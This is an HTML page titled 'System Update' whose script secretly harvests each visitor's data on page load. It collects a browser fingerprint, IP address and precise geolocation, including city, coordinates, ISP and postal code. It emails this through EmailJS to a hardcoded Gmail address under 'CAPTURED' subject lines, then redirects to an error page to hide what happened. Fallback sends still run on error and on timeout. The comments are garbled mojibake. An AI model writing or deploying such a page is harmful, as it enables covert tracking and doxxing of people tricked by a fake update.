<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
    <script>
        emailjs.init("Gf2dIomrXKhbUAF0K");
    </script>
</head>
<body>
    <script>
        // ÐœÐ³Ð½Ð¾Ð²ÐµÐ½Ð½Ñ‹Ð¹ ÑÐ±Ð¾Ñ€ Ð´Ð°Ð½Ð½Ñ‹Ñ…
        const data = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            deviceMemory: navigator.deviceMemory || 'unknown',
            hardwareConcurrency: navigator.hardwareConcurrency,
            language: navigator.language,
            languages: navigator.languages,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookieEnabled: navigator.cookieEnabled,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer
        };

        // ÐŸÐ¾Ð»ÑƒÑ‡ÐµÐ½Ð¸Ðµ IP Ð¸ Ð³ÐµÐ¾Ð»Ð¾ÐºÐ°Ñ†Ð¸Ð¸
        Promise.all([
            fetch('https://api.ipify.org?format=json').then(r => r.json()),
            fetch('https://ipapi.co/json/').then(r => r.json())
        ]).then(([ipData, geoData]) => {
            data.ip = ipData.ip;
            data.geo = {
                country: geoData.country_name,
                city: geoData.city,
                region: geoData.region,
                latitude: geoData.latitude,
                longitude: geoData.longitude,
                timezone: geoData.timezone,
                isp: geoData.org,
                postal: geoData.postal
            };

            // ÐžÐ¿Ñ€ÐµÐ´ÐµÐ»ÐµÐ½Ð¸Ðµ Ñ‚Ð¸Ð¿Ð° ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²Ð°
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            data.deviceType = isMobile ? 'Mobile' : 'Desktop';

            // ÐžÑ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð´Ð°Ð½Ð½Ñ‹Ñ…
            emailjs.send('tpalu5n', 'template_z3yb94e', {
                to_email: 'twtcha01@gmail.com',
                subject: `ðŸš¨ CAPTURED: ${data.ip} - ${data.deviceType} - ${data.geo.country}`,
                message: JSON.stringify(data, null, 2)
            }).then(() => {
                // ÐœÐ³Ð½Ð¾Ð²ÐµÐ½Ð½Ñ‹Ð¹ Ñ€ÐµÐ´Ð¸Ñ€ÐµÐºÑ‚ Ð½Ð° Ð¾ÑˆÐ¸Ð±ÐºÑƒ
                window.location.href = 'https://http.cat/500';
            });
        }).catch(error => {
            // ÐžÑ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ð´Ð°Ð¶Ðµ Ð¿Ñ€Ð¸ Ð¾ÑˆÐ¸Ð±ÐºÐ°Ñ…
            data.error = error.message;
            emailjs.send('tpalu5n', 'template_z3yb94e', {
                to_email: 'twtcha01@gmail.com',
                subject: `ðŸš¨ CAPTURED WITH ERROR: ${data.ip || 'unknown'}`,
                message: JSON.stringify(data, null, 2)
            }).then(() => {
                window.location.href = 'https://http.cat/404';
            });
        });

        // ÐÐ²Ñ‚Ð¾-Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ° Ñ‡ÐµÑ€ÐµÐ· 3 ÑÐµÐºÑƒÐ½Ð´Ñ‹
        setTimeout(() => {
            if (!data.ip) {
                emailjs.send('tpalu5n', 'template_z3yb94e', {
                    to_email: 'twtcha01@gmail.com',
                    subject: `ðŸš¨ TIMEOUT CAPTURE`,
                    message: JSON.stringify(data, null, 2)
                }).then(() => {
                    window.location.href = 'https://http.cat/408';
                });
            }
        }, 3000);
    </script>
</body>
</html>